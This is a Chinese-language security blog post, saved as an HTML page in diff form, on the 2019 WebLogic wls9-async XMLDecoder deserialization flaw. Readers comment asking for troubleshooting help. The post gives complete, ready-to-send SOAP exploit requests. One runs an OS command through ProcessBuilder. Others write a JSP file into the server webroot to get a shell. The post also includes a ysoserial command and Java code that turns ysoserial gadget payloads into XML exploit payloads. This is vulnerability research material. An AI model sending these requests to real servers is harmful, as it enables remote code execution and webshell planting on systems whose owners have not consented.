@@ -1,0 +1,624 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>WebLogic wls9-async 反序列化漏洞 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="背景通过给出的解决方案得知，漏洞存在于 /_async/ 目录，代码位于 bea_wls9_async_response.war、wsat.war 两个包下。有网友说只要/_async/Asyn..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="WebLogic wls9-async 反序列化漏洞 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/127.html" />
+<link rel="alternate" type="application/rdf+xml" title="WebLogic wls9-async 反序列化漏洞 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/127.html" />
+<link rel="alternate" type="application/atom+xml" title="WebLogic wls9-async 反序列化漏洞 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/127.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-127'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-127'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-127'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _BdtXSF = //'42'
+'97'+'27'//'R'
++'a39'//'qu'
++'d38'//'2Ec'
++//'j9'
+'1'+//'X'
+'2'+'1'//'Og'
++'16'//'6XL'
++'71'//'r3p'
++//'J'
+'70'+//'bF9'
+'1'+//'N'
+'8c3'+//'u'
+'2b'+'1'//'LvP'
++//'k'
+'e'+/* 'VW'//'VW' */''+'3'//'uEz'
++//'z'
+'c'+'80c'//'b'
+, _7Q0 = [];
+    
+    for (var i = 0; i < _7Q0.length; i ++) {
+        _BdtXSF = _BdtXSF.substring(0, _7Q0[i][0]) + _BdtXSF.substring(_7Q0[i][1]);
+    }
+
+    return _BdtXSF;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">WebLogic wls9-async 反序列化漏洞</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-04-23 22:08:00" itemprop="datePublished">2019-04-23 22:08:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/127.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/127.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>背景</h1><p>通过给出的解决方案得知，漏洞存在于 <code>/_async/</code> 目录，代码位于 bea_wls9_async_response.war、wsat.war 两个包下。</p><p>有网友说只要<code>/_async/AsyncResponseService</code> 可以访问就说明可能存在漏洞。</p><p>所以问题已经很明显了</p><ul><li>反序列化</li><li>bea_wls9_async_response.war、wls-wsat.war</li><li>/_async/AsyncResponseService</li></ul><p>wls-wsat 这个组件在之前就已经被曝过存在反序列化漏洞，CVE编号是：CVE-2017-10271</p><p>是由JDK的<code>XMLDecoder</code>引起的反序列化，不懂<code>XMLDecoder</code>可以参考 <a href="https://github.com/pwntester/XMLDecoder" target="_blank">https://github.com/pwntester/XMLDecoder</a>。</p><p>由于这次的漏洞也是反序列化，漏洞地址是提供 SOAP Webservice服务的接口，也包含了 wls-wsat 组件，所以不难想象到他们俩是同一个问题。</p><h1>影响范围</h1><pre><code>    Oracle WebLogic Server10.3.6.0.0
+    Oracle WebLogic Server12.1.3.0.0
+    Oracle WebLogic Server12.2.1.1.0
+    Oracle WebLogic Server12.2.1.2.0</code></pre><h1>复现</h1><p>首先本地安装 weblogic，过程不再赘述。</p><p>我是Windows系统，参考一步步安装。<a href="https://blog.csdn.net/qq_36868342/article/details/79967606" target="_blank">https://blog.csdn.net/qq_36868342/article/details/79967606</a></p><p>由于漏洞是和CVE-2017-10271同样的原因引起的。</p><p>所以完全可以使用 CVE-2017-10271 的POC</p><p><strong> CVE-2017-10271 Getshell EXP</strong></p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.8.148:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 756
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
+                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;
+                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
+                    &lt;/object&gt;
+            &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;</code></pre><p>先启动 weblogic 服务，默认会部署 wls9-async 组件</p><p><strong> 这里放上我的命令执行POC </strong></p><pre><code>POST /_async/AsyncResponseService HTTP/1.1
+Host: 127.0.0.1:7001
+Accept-Encoding: gzip, deflate
+SOAPAction: 
+Accept: */*
+Connection: keep-alive
+Content-Type: text/xml
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.xmlDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;cmd&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;/c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>在本地成功弹出了计算器。<br><img src="/usr/uploads/2019/04/2822193314.jpg" alt="1556029637(1).jpg" title="1556029637(1).jpg"></p><p>反编译一下存在漏洞的war包<code>com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</code></p><p><img src="/usr/uploads/2019/04/3420106259.jpg" alt="1556029984(1).jpg" title="1556029984(1).jpg"></p><p>给 weblogic 开启 debug 模式，在 idea 远程debug并给 xmldecoder 的 readObject 方法打上断点可以看到栈都走了那些方法。</p><p><img src="/usr/uploads/2019/04/3187925549.jpg" alt="1556032248(1).jpg" title="1556032248(1).jpg"></p><p>如果一个接口不成功，可以试试这三个接口</p><pre><code>AsyncResponseServiceHttps
+AsyncResponseService
+AsyncResponseServiceJms</code></pre><p><strong> getshell </strong></p><pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.xmlDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[123]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="/usr/uploads/2019/04/2018799308.jpg" alt="1556072974(1).jpg" title="1556072974(1).jpg"></p><hr><p><strong> 2019.04.25 更新 </strong></p><p>自从漏洞被公开后陆陆续续出来了一些 POC</p><p>其中有一个比较长的</p><pre><code>
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+ xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;
+ xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;
+    &lt;soapenv:Header&gt;
+ &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;
+ &lt;wsa:RelatesTo&gt;urn:uuid:91576FE2-4533-43CB-BFA1-51D2B631453A&lt;/wsa:RelatesTo&gt;
+ &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+ &lt;java&gt;
+  &lt;class&gt;
+    &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;
+&lt;void&gt;
+    &lt;array class=&quot;byte&quot; length=&quot;1452&quot;&gt;
+&lt;void index=&quot;0&quot;&gt;
+  &lt;byte&gt;-84&lt;/byte&gt;
+&lt;/void&gt;
+&lt;void index=&quot;1&quot;&gt;
+  &lt;byte&gt;-19&lt;/byte&gt;
+&lt;/void&gt;
+&lt;void index=&quot;2&quot;&gt;
+  &lt;byte&gt;0&lt;/byte&gt;
+&lt;/void&gt;
+&lt;void index=&quot;3&quot;&gt;
+  &lt;byte&gt;5&lt;/byte&gt;
+&lt;/void&gt;
+//省略.....
+&lt;void index=&quot;1451&quot;&gt;
+  &lt;byte&gt;58&lt;/byte&gt;
+&lt;/void&gt;&lt;/array&gt;
+     &lt;/void&gt;
+    &lt;/class&gt;
+ &lt;/java&gt;
+ &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body&gt;
+            &lt;asy:onAsyncDelivery/&gt;
+     &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre><p>但具体不知道是哪个版本的，我在 12.1.3 上没找到<code>UnitOfWorkChangeSet</code>这个类。</p><p>不过根据源码来看，构造方法就是将一个传入的 byte 数组再反序列化成<code>IdentityHashtable</code>对象。</p><p><a href="http://kickjava.com/src/oracle/toplink/essentials/internal/sessions/UnitOfWorkChangeSet.java.htm" target="_blank">http://kickjava.com/src/oracle/toplink/essentials/internal/sessions/UnitOfWorkChangeSet.java.htm</a></p><p>那么利用方式就很明显了：通过传入payload对象的字节码对象来反序列化。</p><p>这里我用ysoserial生成一个payload</p><blockquote><p>java -jar ysoserial-master-ff59523eb6-1.jar CommonsCollections5 "calc" &gt; E:/1.txt</p></blockquote><p>然后再读取文件反序列化成java对象，再读取他的字节码，最后让xmlEncoder转成 xml格式。</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e98b859c8ca980919a8c8ac7869b8e">[email&#160;protected]</a>
+ * @since 2019/4/24 12:09
+ */
+public class Test {
+
+    public static void main(String[] args) throws Exception {
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;E:/1.txt&quot;));
+        Object o = objectInputStream.readObject();
+
+        byte[] bytes = ObjectToByte(o);
+
+        objectXmlEncoder(bytes , &quot;E:/123.xml&quot;);
+
+    }
+
+    private static byte[] ObjectToByte(Object obj) {
+        byte[] bytes = null;
+        try {
+            // object to bytearray
+            ByteArrayOutputStream bo = new ByteArrayOutputStream();
+            ObjectOutputStream oo = new ObjectOutputStream(bo);
+            oo.writeObject(obj);
+
+            bytes = bo.toByteArray();
+
+            bo.close();
+            oo.close();
+        } catch (Exception e) {
+            System.out.println(&quot;translation&quot; + e.getMessage());
+            e.printStackTrace();
+        }
+        return bytes;
+    }
+
+    public static void objectXmlEncoder(Object obj,String fileName)
+            throws FileNotFoundException,IOException,Exception
+    {
+
+
+        java.io.File file = new java.io.File(fileName);
+        if(!file.exists()){
+            file.createNewFile();
+        }
+
+
+
+        java.io.BufferedOutputStream oop = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file));
+        java.beans.XMLEncoder xe = new java.beans.XMLEncoder(oop);
+        xe.flush();
+        //写入xml
+        xe.writeObject(obj);
+        xe.close();
+        oop.close();
+    }
+
+}</code></pre><p><img src="/usr/uploads/2019/04/297928187.jpg" alt="1556175042(1).jpg" title="1556175042(1).jpg"></p><p><strong>无需经过序列化生成xml payload</strong></p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="385a544d5d7851404b5d5b16574a5f">[email&#160;protected]</a>
+ * @since 2019/4/24 12:09
+ */
+public class Test{
+    public static void main(String[] args) throws Exception {
+
+        File file = new File(&quot;E:/1.txt&quot;);
+        //读取ysoserial文件生成的payload
+        FileInputStream fileInputStream = new FileInputStream(file);
+
+        //初始化比特数组输出流
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((int) file.length());
+
+        int buf_size=1024;
+        byte[] buffer=new byte[buf_size];
+        int len=0;
+        //读取文件中的内容转到byte数组输出流
+        while(-1 != (len=fileInputStream.read(buffer,0,buf_size))){
+            byteArrayOutputStream.write(buffer,0,len);
+        }
+
+        BufferedOutputStream oop = new BufferedOutputStream(new FileOutputStream(new File(&quot;E:/2.txt&quot;)));
+        
+        //使用jdk的xmlencoder把byte数组写入到 e:/2.txt
+        XMLEncoder xmlEncoder = new XMLEncoder(oop);
+        xmlEncoder.flush();
+        xmlEncoder.writeObject(byteArrayOutputStream.toByteArray());
+        xmlEncoder.close();
+        byteArrayOutputStream.close();
+        fileInputStream.close();
+
+    }
+}</code></pre>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 7 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-2" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/d17c924400a08386fa0b92750480c2c0?s=32&r=G&d=" alt="lsa" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">lsa									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=2#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-2', 2);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2019-05-12 21:48:40" itemprop="datePublished">2019-05-12 21:48:40</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>hi，我尝试导入了所有weblogic的jar包，都无法生成123.xml，报错Exception in thread "main" java.io.InvalidObjectException: Non-annotation type in annotation serial stream<br>
+......<br>
+at java.io.ObjectInputStream.readObject0(Unknown Source)<br>
+	at java.io.ObjectInputStream.readObject(Unknown Source)<br>
+	at toxml.Toxml.main(Toxml.java:16)<br>
+请问这要如何解决？<br>
+//eclipse-jee-2018-12-r+win7+jdk8u201+您的代码</p>					</div>
+			</div>
+                </li>
+        <li class="comment">
+			<div id="comment-3" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/8fcb945d487c486ab52a524b3d5792ae?s=32&r=G&d=" alt="浅蓝" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author"><a href="https://b1ue.cn/" rel="external nofollow">浅蓝</a>									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=3#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-3', 3);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2019-05-18 11:26:14" itemprop="datePublished">2019-05-18 11:26:14</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>很多朋友在复现的时候遇到了一些异常，这里大家一点建议。<br>
+生成 payload 的过程是 ：读取 ysoserial payload > 反序列化成 Java 对象 > 对象转 byte 数组 > XMLEncoder 生成 payload。<br>
+根据问题来看基本上都是在第二步出的问题，因为需要再反序列化成 java 对象，如果当前运行的环境里和 ysoserial payload 有出入，可能会出现问题，所以需要保证运行环境里要和ysoserial payload的依赖版本对应。</p><p>如果还是解决不了，建议直接读取字节码按照固定格式生成。</p>					</div>
+			</div>
+                </li>
+        <li class="comment">
+			<div id="comment-4" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/7319496faffb4e75d20c4d7f2674462c?s=32&r=G&d=" alt="lee" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">lee									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=4#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-4', 4);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2019-06-17 14:59:54" itemprop="datePublished">2019-06-17 14:59:54</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>translationcom.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable<br>
+java.io.NotSerializableException: com.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable</p><p>java代码运行报错</p>					</div>
+			</div>
+                            <ol class="children">
+                    <ol class="comment-list">    <li class="comment">
+			<div id="comment-5" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/8fcb945d487c486ab52a524b3d5792ae?s=32&r=G&d=" alt="浅蓝" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author"><a href="https://b1ue.cn/" rel="external nofollow">浅蓝</a>									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=5#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-5', 5);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2019-06-26 10:02:23" itemprop="datePublished">2019-06-26 10:02:23</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>换jdk版本到1.8</p>					</div>
+			</div>
+                </li>
+    </ol>                </ol>
+                </li>
+        <li class="comment">
+			<div id="comment-25" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/15308fec13bdfc183ff330a5ffb68ce8?s=32&r=G&d=" alt="非凡" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">非凡									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=25#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-25', 25);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-12-10 17:28:18" itemprop="datePublished">2020-12-10 17:28:18</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>大佬好我想问一下这个代码报错<br>
+XMLEncoder e = new XMLEncoder(<br>
+		        		                           new BufferedOutputStream(<br>
+		        		                               new FileOutputStream("Test.xml")));<br>
+		        		       e.writeObject(new ProcessBuilder("calc"));<br>
+		        		        e.close();</p><p>把上面那个代码换成这个<br>
+e.writeObject(new String("xxxxx"));<br>
+不报错</p><p>报错内容<br>
+java.lang.InstantiationException: java.lang.ProcessBuilder<br>
+Continuing ...<br>
+java.lang.Exception: XMLEncoder: discarding statement XMLEncoder.writeObject(ProcessBuilder);<br>
+Continuing ...<br>
+我搜索了一下说是反射没有找到构造函数我看ProcessBuilder 有构造函数啊求大佬抽空解答一下。为很么不能这么生成</p>					</div>
+			</div>
+                </li>
+        <li class="comment">
+			<div id="comment-26" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/15308fec13bdfc183ff330a5ffb68ce8?s=32&r=G&d=" alt="非凡" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">非凡									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=26#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-26', 26);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-12-11 13:27:04" itemprop="datePublished">2020-12-11 13:27:04</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>大佬我明白了是不是这么理解 ProcessBuilder 没有继承Serializable接口所以报错了</p>					</div>
+			</div>
+                            <ol class="children">
+                    <ol class="comment-list">    <li class="comment">
+			<div id="comment-27" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/8fcb945d487c486ab52a524b3d5792ae?s=32&r=G&d=" alt="浅蓝" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author"><a href="https://b1ue.cn/" rel="external nofollow">浅蓝</a>									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/127.html?replyTo=27#respond-post-127" rel="nofollow" onclick="return TypechoComment.reply('comment-27', 27);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-12-18 14:20:12" itemprop="datePublished">2020-12-18 14:20:12</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>差不多是这个意思，即使继承了 serialaable 也不行，反序列化漏洞需要 gadget，不是随便new一个对象就能构成攻击效果的。</p>					</div>
+			</div>
+                </li>
+    </ol>                </ol>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-127" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/127.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/127.html#respond-post-127" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
